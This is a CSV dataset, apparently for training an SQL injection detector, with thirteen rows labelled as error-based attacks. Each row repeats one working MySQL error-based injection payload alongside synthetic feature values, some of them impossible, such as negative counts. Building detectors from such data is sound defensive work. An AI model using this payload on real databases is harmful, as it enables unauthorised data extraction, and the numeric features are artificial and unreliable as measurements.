id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_001848,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000049,6.784993017186684,290.6946716308594,104.63843536376953,43.51474380493164,115.83477783203125,-14.336061477661133,98.2659683227539,40.69982147216797,1.5338377952575684,0.34993571043014526,0.09493325650691986,0.3600611686706543,0.1337248980998993,4.054652214050293,1.4342669248580933,1.0267337560653687,0.09827762842178345,0.32197925448417664,0.2608664631843567,-0.3977738618850708,13.256250381469727,12.228343963623047,1.9824501276016235,0.25705960392951965,1.8372938632965088,0.16492629051208496,-0.3438246250152588,-0.1062188670039177,0.19374731183052063,1.5399008989334106,0.5100933313369751,0.09681137651205063,1.04628324508667,0.3051988482475281,0.45982182025909424,1.3753515481948853,5.684986591339111,0.887900173664093,3.2524254322052,1.4606963396072388,-0.26204589009284973,0.9050536155700684,-0.3935018479824066,0.11602700501680374,-0.13377875089645386,0.06384069472551346,-1.3330137729644775,0.28025686740875244,0.09539061039686203,0.13823702931404114,0.1797819286584854,0.9505411982536316,0.7052322626113892,-0.4962058961391449,0.3538847863674164,0.13286001980304718,0.22092989087104797,0.040391504764556885,-0.5254629850387573,-0.0005530621856451035,0.15240561962127686,-0.2925569713115692,-0.551711916923523,-0.973033607006073,0.003645870601758361,-0.5276763439178467,0.5747674107551575,-1.1128878593444824,-0.3442568778991699,0.9765964150428772,-0.6851426362991333,0.35540106892585754,0.3407739996910095,-0.46726566553115845,-0.1836666762828827,-0.03714951127767563,1.4378662109375,0.416443794965744,-0.21421362459659576,0.046201422810554504,0.7092658877372742,11.388869285583496,1.2109253406524658,0.46528714895248413,-0.038448840379714966,0.7800825238227844,-0.27989041805267334,1.0368578433990479,0.5554080009460449
GAN_001849,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000049,5.392975234030961,285.7583312988281,105.12276458740234,38.829505920410156,102.1822509765625,-4.183082580566406,90.18510437011719,37.943424224853516,1.2978870868682861,0.34638938307762146,0.13024666905403137,0.37862899899482727,0.13439835608005524,3.940657138824463,1.3019416332244873,0.7799511551856995,0.23060250282287598,0.07839702069759369,0.08789362013339996,0.09279760718345642,11.494007110595703,10.831138610839844,3.0427303314208984,0.30247369408607483,1.82260000705719,0.26678332686424255,-0.20452231168746948,0.06171302869915962,0.11179035902023315,1.2112457752227783,0.4119894504547119,0.1096392497420311,1.6249659061431885,-0.164304718375206,0.20250464975833893,1.8474918603897095,6.988677501678467,0.8543912768363953,2.8104515075683594,0.536811113357544,0.10371746867895126,1.0963085889816284,-0.338382750749588,0.056805066764354706,0.007122702896595001,-0.004107221961021423,-0.5406551957130432,0.33277052640914917,0.1856481283903122,0.2547730803489685,0.22389094531536102,0.5762174725532532,0.15072676539421082,0.039401888847351074,0.5659304261207581,0.1413843184709549,0.06691189110279083,0.21940702199935913,-0.27786457538604736,-0.15230882167816162,0.04170434921979904,-0.26597869396209717,-0.2289419323205948,-0.6480589509010315,0.0016021727351471782,-0.26343828439712524,0.650871217250824,-0.4878184497356415,0.031191546469926834,0.34187042713165283,-0.3050149977207184,-0.21835051476955414,0.16701100766658783,-0.12690876424312592,-0.0582834929227829,0.13532191514968872,1.300768494606018,0.46344631910324097,-0.16068141162395477,0.041845448315143585,0.4042123258113861,10.52086353302002,1.0228339433670044,0.33845585584640503,0.0771646499633789,0.7550532221794128,-0.49654439091682434,0.5484289526939392,0.03574017807841301
GAN_001850,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000049,7.001503258466816,286.5669250488281,102.87935638427734,41.01645278930664,121.56522369384766,-15.048761367797852,84.87982177734375,40.71754837036133,1.3788342475891113,0.3378095328807831,0.1069139689207077,0.3659123182296753,0.14065906405448914,4.0380167961120605,1.6513087749481201,1.1984325647354126,-0.3017164468765259,0.3932661712169647,0.09725068509578705,-0.5200268030166626,12.49254035949707,11.334126472473145,1.637734055519104,0.5559148192405701,1.6974886655807495,0.11667940020561218,-0.4052289128303528,-0.10314526408910751,0.1453961879014969,1.4176133871078491,0.39314019680023193,0.1866944432258606,0.9739985466003418,-0.11003567278385162,0.4920191168785095,1.5772114992141724,4.985827445983887,0.6089750528335571,3.5168206691741943,1.3405770063400269,-0.35724928975105286,0.6754114031791687,-0.36993998289108276,0.06601330637931824,-0.19838863611221313,-0.17220886051654816,-1.33729088306427,0.36091506481170654,0.09188448637723923,0.2024204581975937,0.21087968349456787,0.8255558013916016,0.5195683836936951,-0.49202683568000793,0.39067715406417847,0.2698436975479126,0.20079071819782257,0.39476338028907776,-0.3994112014770508,0.03188781067728996,0.13088303804397583,0.0210423581302166,-0.6626460552215576,-0.6102150678634644,0.052214719355106354,-0.647920548915863,0.4791416823863983,-1.1728729009628296,-0.26190271973609924,0.8860815763473511,-0.57773357629776,0.4933624565601349,0.286283403635025,-0.46959686279296875,-0.07078945636749268,0.031758349388837814,1.282132863998413,0.4770856201648712,-0.19880247116088867,-0.04468821734189987,0.6993889808654785,12.30077838897705,1.2042207717895508,0.4955931007862091,-0.0371001660823822,0.8628715872764587,-0.7215721607208252,0.7571272253990173,0.5341358184814453
GAN_001851,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000049,5.469230977269169,276.4454345703125,101.09463500976562,37.960453033447266,106.86896514892578,-7.675334930419922,91.13530731201172,37.1988525390625,1.2658720016479492,0.33347323536872864,0.1275569349527359,0.3694430887699127,0.1379348486661911,4.017385959625244,1.243262529373169,0.8372933864593506,0.19360461831092834,0.2195708006620407,0.07426437735557556,-0.09130082279443741,11.480207443237305,10.935783386230469,2.6427557468414307,0.243936225771904,1.8443361520767212,0.1636723428964615,-0.3549342751502991,-0.025249037891626358,0.12442585080862045,1.2183253765106201,0.5137940645217896,0.1437189280986786,1.389135718345642,-0.21721434593200684,0.26587966084480286,1.5796877145767212,6.666331768035889,0.9353294372558594,2.911728620529175,1.031428337097168,-0.09812871366739273,1.2279891967773438,-0.44583144783973694,0.06589416414499283,-0.12643912434577942,0.06659413874149323,-0.880098819732666,0.2893790006637573,0.1373264491558075,0.22757893800735474,0.2024570107460022,0.5922192335128784,0.38122740387916565,-0.1757185459136963,0.49135491251945496,0.10439839959144592,0.21029745042324066,0.0006145946681499481,-0.31524449586868286,-0.13296937942504883,0.0957259014248848,-0.0994926169514656,-0.06407002359628677,-0.8116087913513184,0.0009619889897294343,-0.4839708209037781,0.706836462020874,-0.3799792528152466,-0.16283650696277618,0.5049212574958801,-0.3895760774612427,0.14330409467220306,0.013946987688541412,-0.45312929153442383,-0.2515162527561188,0.017965547740459442,1.3427773714065552,0.46642035245895386,-0.2571395933628082,0.04862789064645767,0.5740887522697449,11.010871887207031,1.2085636854171753,0.357198029756546,0.004259831737726927,0.8400698304176331,-0.2294125258922577,0.792406439781189,0.21214722096920013
GAN_001852,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000049,6.5127290056045295,293.0730285644531,97.82825469970703,40.92024230957031,113.63785552978516,-11.16888427734375,87.66381072998047,42.31072998046875,1.8086507320404053,0.35114315152168274,0.12812335789203644,0.37121468782424927,0.1464502215385437,4.009243011474609,1.0126240253448486,0.7689356207847595,0.16181591153144836,0.29928502440452576,0.19433560967445374,-0.26892802119255066,11.533196449279785,11.482076644897461,1.7477110624313354,0.21146070957183838,1.716652750968933,0.2011471837759018,-0.1883930265903473,-0.14817212522029877,0.1665520817041397,1.213297724723816,0.7067343592643738,0.0735728070139885,1.2575130462646484,-0.23847880959510803,0.31040894985198975,1.5752413272857666,6.066364765167236,0.7592594027519226,3.4404497146606445,1.1144943237304688,-0.189859077334404,1.1096264123916626,-0.5404692888259888,0.11183035373687744,-0.08643607795238495,0.04915570467710495,-1.2619086503982544,0.34564390778541565,0.052729539573192596,0.3373047411441803,0.07334514707326889,0.816024899482727,0.28828245401382446,-0.23627106845378876,0.3468536138534546,0.10989173501729965,0.13781201839447021,0.021624792367219925,-0.5815463662147522,-0.286019504070282,0.27031970024108887,0.06259685009717941,-0.3853830397129059,-0.9290438890457153,0.01116405613720417,-0.5627719163894653,0.5823009610176086,-1.0131055116653442,-0.44369450211524963,0.5997514724731445,-0.439484179019928,0.11100735515356064,0.03330943360924721,-0.5105484127998352,-0.03761810064315796,0.11432803422212601,1.4296692609786987,0.5072887539863586,-0.5307050347328186,0.05891721695661545,0.39711833000183105,10.93593978881836,1.352245569229126,0.36818379163742065,0.01599271409213543,0.7447757720947266,-0.23854991793632507,0.8357927799224854,0.23559992015361786
GAN_001853,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000049,6.728930572419633,287.66046142578125,102.98635864257812,40.8046989440918,105.20674133300781,-17.420026779174805,86.99065399169922,39.050048828125,1.4966366291046143,0.34045517444610596,0.11771904677152634,0.36185696721076965,0.1446102410554886,4.060690879821777,0.9942821264266968,1.0721420049667358,0.1896952986717224,0.16821280121803284,0.5536680221557617,-0.2987315058708191,12.189556121826172,11.63902473449707,1.8973697423934937,0.5268277525901794,1.486798644065857,0.22550643980503082,-0.18402060866355896,-0.08533608168363571,0.19531197845935822,1.326505184173584,0.5764449238777161,0.14856120944023132,1.1565278768539429,-0.4750893712043762,0.17640435695648193,1.6033858060836792,6.321084499359131,0.6104799509048462,3.563965082168579,1.278197169303894,-0.43027904629707336,1.2006535530090332,-0.6105421781539917,0.058242619037628174,-0.1077694371342659,0.3149193525314331,-1.2976173162460327,0.24963738024234772,-0.04281926900148392,0.2698240280151367,0.0734819695353508,0.7418233752250671,0.6224237680435181,-0.14225871860980988,0.360639363527298,0.08298605680465698,0.23322121798992157,-0.051285479217767715,-0.6452441215515137,-0.04850127547979355,0.13675859570503235,-0.033544838428497314,-0.21183818578720093,-1.2617878913879395,-0.016952715814113617,-0.603598952293396,0.5771852135658264,-1.088128685951233,-0.4525596797466278,0.712034285068512,-0.1925044059753418,0.016669608652591705,-0.16937437653541565,-0.4449462294578552,-0.44302892684936523,-0.026418551802635193,1.7004718780517578,0.4790728986263275,-0.43412354588508606,0.06148206442594528,0.26661139726638794,10.722712516784668,1.5687965154647827,0.4646201729774475,-0.00827430747449398,0.8041064739227295,-0.45876190066337585,1.129846215248108,0.6895415782928467
GAN_001854,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000049,5.837337185816124,281.85113525390625,104.2527084350586,43.56295394897461,116.17528533935547,-8.905261039733887,91.25234985351562,39.87853240966797,1.4381427764892578,0.32962456345558167,0.11569884419441223,0.3674100637435913,0.1284492164850235,4.016660690307617,1.6788804531097412,0.9522035121917725,0.09376788139343262,0.28117087483406067,0.06786888837814331,-0.34308645129203796,11.940476417541504,11.68978500366211,2.627418279647827,0.3326352834701538,1.7665295600891113,0.23279117047786713,-0.38845187425613403,0.11651831865310669,0.17167040705680847,1.4936200380325317,0.2744874358177185,0.025316059589385986,1.0541833639144897,0.027471959590911865,0.36693429946899414,1.5208747386932373,6.617986679077148,1.0044900178909302,3.5645902156829834,0.9875954389572144,-0.10202539712190628,1.0486900806427002,-0.2630029618740082,0.06939530372619629,-0.04031176492571831,0.23409727215766907,-0.8957119584083557,0.3109763264656067,0.12258508056402206,0.24059893190860748,0.13565659523010254,0.7684561610221863,0.35204505920410156,-0.5255162119865417,0.4697752594947815,0.1473926156759262,0.24558424949645996,-0.16756728291511536,-0.3148135542869568,-0.15015004575252533,-0.02947082743048668,-0.11243651062250137,-0.36689135432243347,-0.80433589220047,0.017202990129590034,-0.5861024856567383,0.6126461029052734,-0.7656091451644897,-0.039077892899513245,0.5771632194519043,-0.5236480236053467,0.2050255686044693,0.31886303424835205,-0.3555387854576111,-0.09266088902950287,-0.08005066215991974,1.4719561338424683,0.29101425409317017,-0.20586951076984406,0.001423441106453538,0.6513497233390808,10.372573852539062,1.1434738636016846,0.4532056152820587,-0.010642969980835915,0.8766021728515625,-0.49867644906044006,1.033761739730835,0.7312374114990234
GAN_001855,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000049,6.518324823179546,289.147216796875,102.07424926757812,39.54310607910156,109.10206604003906,-14.236438751220703,89.95829010009766,37.28925704956055,1.3066705465316772,0.3507572114467621,0.11189066618680954,0.3675408363342285,0.1408393383026123,3.9791111946105957,1.5657752752304077,1.1348903179168701,0.13025936484336853,0.24955995380878448,0.3656266927719116,-0.3117465674877167,12.214096069335938,11.764078140258789,2.1910228729248047,0.40984907746315,1.9630141258239746,0.1255589872598648,-0.20516464114189148,-0.06925981491804123,0.21982023119926453,1.3144028186798096,0.44498077034950256,-0.04458841681480408,1.2412580251693726,-0.2635743319988251,0.36006566882133484,1.7396068572998047,6.206728458404541,0.6785500049591064,3.330502986907959,1.4867244958877563,-0.30747124552726746,0.9687237739562988,-0.44506722688674927,0.04883347824215889,-0.20614202320575714,-0.23190230131149292,-1.2586709260940552,0.35099852085113525,0.2236325889825821,0.21981248259544373,0.21929846704006195,0.9022818803787231,0.3314354121685028,-0.22055235505104065,0.42803800106048584,0.15356186032295227,0.1480090320110321,0.3204912543296814,-0.4212036728858948,-0.20931826531887054,0.04613015800714493,-0.11263636499643326,-0.44104844331741333,-0.9691335558891296,0.009124764241278172,-0.43864476680755615,0.6008012890815735,-1.2504969835281372,-0.37568098306655884,1.0306423902511597,-0.5154719948768616,0.1555303931236267,0.17009709775447845,-0.4815177321434021,-0.1909646987915039,-0.07954412698745728,1.48473060131073,0.4480832815170288,-0.2503485679626465,0.015501730144023895,0.5165489912033081,11.40202808380127,1.2246681451797485,0.41635772585868835,-0.016443369910120964,0.7829548716545105,-0.6320585012435913,0.8205609321594238,0.2732962965965271
GAN_001856,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000049,5.838078324548032,282.9875793457031,98.16751861572266,40.50114822387695,108.23575592041016,-8.468789100646973,87.46684265136719,34.57028579711914,1.3168928623199463,0.3459470868110657,0.10801654309034348,0.3731231987476349,0.12778764963150024,3.96667742729187,1.914218544960022,0.9882252812385559,-0.09243255853652954,0.22065946459770203,0.11210070550441742,-0.1985311210155487,11.487374305725098,10.077682495117188,3.170369863510132,0.23331253230571747,1.9789787530899048,0.09728719294071198,-0.3011929392814636,-0.15449146926403046,0.1873837411403656,1.4234219789505005,0.07018810510635376,0.1704936921596527,1.479541540145874,-0.010419921949505806,0.3685693144798279,1.7893054485321045,5.807823657989502,0.801735520362854,3.026134490966797,1.1402571201324463,-0.14751003682613373,0.778304934501648,-0.4617599546909332,0.07338669151067734,-0.0495804026722908,0.04868777096271515,-0.6087051630020142,0.16068309545516968,0.17898710072040558,0.04978444427251816,0.12452670186758041,0.659288763999939,0.3136608600616455,-0.41491052508354187,0.46667981147766113,0.15834933519363403,0.09611804038286209,0.023596901446580887,-0.0016870386898517609,-0.09731310606002808,-0.4195933938026428,0.010380357503890991,-0.2882843613624573,-0.8166316747665405,-0.003250879468396306,-0.38650083541870117,0.5845054984092712,-0.8479487895965576,-0.23435160517692566,0.5717101097106934,-0.5069754123687744,0.06360646337270737,0.17686793208122253,-0.5979425311088562,0.10065698623657227,-0.08703786134719849,1.236756443977356,0.46329250931739807,0.029157094657421112,0.022551074624061584,0.7066534757614136,11.058531761169434,1.0459308624267578,0.37015217542648315,0.022478658705949783,0.9161090850830078,-0.7470407485961914,0.3917625844478607,0.2712441086769104
GAN_001857,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000049,7.526223771823469,285.41949462890625,106.61449432373047,40.427494049072266,125.2832260131836,-17.421953201293945,82.77307891845703,41.04057693481445,1.527355432510376,0.34715673327445984,0.09705542027950287,0.36171314120292664,0.14477820694446564,4.08468770980835,0.8940154910087585,1.3572636842727661,0.023709863424301147,0.44400322437286377,0.1125078797340393,-0.6095864176750183,12.90436840057373,13.536117553710938,0.9826644659042358,0.5881934762001038,1.7725094556808472,0.15438854694366455,-0.23017928004264832,-0.13156728446483612,0.15091030299663544,1.3971318006515503,0.8437864780426025,0.012905970215797424,0.6772568821907043,-0.1321357935667038,0.4180932343006134,1.4434077739715576,5.324451923370361,0.5545276403427124,3.932434320449829,1.2078577280044556,-0.5058863759040833,0.8180679678916931,-0.45668619871139526,0.07820528745651245,0.049166612327098846,-0.07747681438922882,-1.690341591835022,0.42544957995414734,0.1320515275001526,0.3863458037376404,0.12733152508735657,0.960023045539856,0.6217198371887207,-0.03982579708099365,0.4611068367958069,0.14924390614032745,0.2997163236141205,0.002920009195804596,-0.7420686483383179,-0.4491524398326874,0.23805436491966248,0.05667201429605484,-0.2160751074552536,-0.8695635199546814,0.023213237524032593,-0.7608283162117004,0.6018556952476501,-1.4037861824035645,-0.3874662220478058,0.9370107650756836,-0.5396655201911926,0.4954257607460022,0.2996651530265808,-0.5252436399459839,-0.20310387015342712,0.15618383884429932,1.6260801553726196,0.45587822794914246,-0.5206717848777771,-0.05087027698755264,0.3787747025489807,11.977097511291504,1.4226768016815186,0.6377435922622681,-0.039231330156326294,0.6959665417671204,-0.2541886270046234,1.253538727760315,0.31994545459747314
GAN_001858,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000049,6.459873771049213,277.00555419921875,105.31359100341797,44.54765701293945,117.14399719238281,-16.145498275756836,93.53534698486328,39.15978240966797,1.3829832077026367,0.34442245960235596,0.10792230814695358,0.3708339035511017,0.1326257735490799,4.107822418212891,1.4894299507141113,0.9865567088127136,0.07201313972473145,0.36445319652557373,0.09820325672626495,-0.47522425651550293,12.486319541931152,11.828902244567871,2.2429049015045166,0.46116769313812256,1.7329922914505005,0.19695143401622772,-0.4353981018066406,-0.08244281262159348,0.2049807459115982,1.560098648071289,0.49226129055023193,-0.006173502653837204,1.004867434501648,-0.04932280257344246,0.43363305926322937,1.4106354713439941,5.444195747375488,0.891389787197113,3.648912191390991,1.1506502628326416,-0.3190412223339081,1.0287801027297974,-0.565586268901825,0.07443136721849442,0.06296602636575699,0.16560214757919312,-1.1630150079727173,0.21843640506267548,0.03251468390226364,0.28208640217781067,0.10126998275518417,0.759371817111969,0.5469712018966675,-0.3443790674209595,0.5016608238220215,0.22701451182365417,0.2679655849933624,-0.19651171565055847,-0.4902508854866028,-0.27631866931915283,-0.1779434084892273,0.06609372794628143,-0.25732335448265076,-0.8181362152099609,0.024841662496328354,-0.6841418147087097,0.5680705904960632,-0.865234375,-0.0362175777554512,0.5955299139022827,-0.498555451631546,0.30108925700187683,0.41360533237457275,-0.5961908102035522,-0.10636897385120392,0.24968159198760986,1.6699578762054443,0.3097165822982788,-0.06459994614124298,-0.01802525669336319,0.6130263209342957,11.560216903686523,1.3598031997680664,0.5482648015022278,-0.0336722806096077,0.7829172015190125,-0.40984874963760376,1.3237055540084839,0.8139026165008545
GAN_001859,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000049,6.022303709469823,292.7405700683594,109.04911804199219,40.643463134765625,109.29141235351562,-11.741796493530273,97.892578125,40.86436080932617,1.415533423423767,0.35692206025123596,0.11746557056903839,0.36978045105934143,0.1337217092514038,4.006989479064941,1.0183677673339844,0.7188137173652649,0.3295055627822876,0.2468552142381668,-0.01668117567896843,-0.05193472281098366,12.036641120910645,12.373953819274902,2.4357070922851562,0.304789274930954,1.9441447257995605,0.25001251697540283,-0.310388445854187,-0.03379442170262337,0.1294684261083603,1.4145293235778809,0.6850009560585022,-0.03199594467878342,1.0934849977493286,-0.10553249716758728,0.2907158434391022,1.5168269872665405,6.241265296936035,0.8131653666496277,3.233304023742676,1.0079160928726196,-0.1393885463476181,1.1117603778839111,-0.36730244755744934,0.06863854080438614,0.03207860887050629,-0.009547673165798187,-0.9874443411827087,0.3759195804595947,0.1429438591003418,0.3164995610713959,0.1676953136920929,0.8599240779876709,0.4707260727882385,0.029151367023587227,0.6139787435531616,0.15469080209732056,0.17210201919078827,0.06208977475762367,-0.4085817337036133,-0.49915722012519836,-0.013501007109880447,-0.0906614288687706,-0.12974533438682556,-1.0006804466247559,0.005050370469689369,-0.698358416557312,0.5992299914360046,-0.6734449863433838,-0.021322689950466156,0.48157334327697754,-0.5495176911354065,0.10033239424228668,0.30283069610595703,-0.46722227334976196,-0.1872948706150055,0.15743304789066315,1.5409191846847534,0.3433113992214203,-0.2857610583305359,-0.024929188191890717,0.47821730375289917,10.762215614318848,1.19234037399292,0.5269343256950378,0.027704263105988503,0.8000941276550293,-0.25303271412849426,1.0925335884094238,0.19135208427906036
GAN_001860,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000049,5.712622051198856,285.81878662109375,97.96399688720703,41.42422866821289,108.86100006103516,-6.049372673034668,88.88292694091797,40.045677185058594,1.470574140548706,0.35178524255752563,0.12653642892837524,0.37531858682632446,0.13250388205051422,3.9173953533172607,1.3961621522903442,0.7226494550704956,0.4549439251422882,0.252227246761322,0.2257775217294693,-0.11127769947052002,11.448241233825684,11.816783905029297,2.557391405105591,0.15640586614608765,1.7834053039550781,0.1868923157453537,-0.21872666478157043,0.058696720749139786,0.10690867900848389,1.100930094718933,0.4190104901790619,0.10874775797128677,1.2634204626083374,0.002955077216029167,0.31625068187713623,1.6575863361358643,6.93514347076416,0.8154080510139465,3.0157201290130615,0.9763401746749878,-0.028766969218850136,0.987350344657898,-0.18358010053634644,0.07883881032466888,-0.18362680077552795,0.12031897157430649,-0.9170248508453369,0.34327855706214905,0.20129847526550293,0.29033035039901733,0.2964949607849121,0.7099367380142212,0.3367128074169159,-0.28997036814689636,0.3839803636074066,0.08742765337228775,0.2172863930463791,-0.10665076971054077,-0.36073100566864014,-0.07778754085302353,0.15197008848190308,-0.047494418919086456,-0.19187229871749878,-0.8225241899490356,-0.012878240086138248,-0.4664362072944641,0.669286847114563,-0.8310502767562866,-0.2791701555252075,0.5307919383049011,-0.4546429514884949,0.1927962303161621,0.17238153517246246,-0.407817542552948,-0.217241108417511,-0.05962337553501129,1.2415823936462402,0.3911268711090088,-0.29318153858184814,0.04333610087633133,0.48650816082954407,10.386401176452637,1.0973535776138306,0.3349493145942688,0.01155740674585104,0.738754153251648,-0.30284273624420166,0.747591495513916,0.3362630605697632
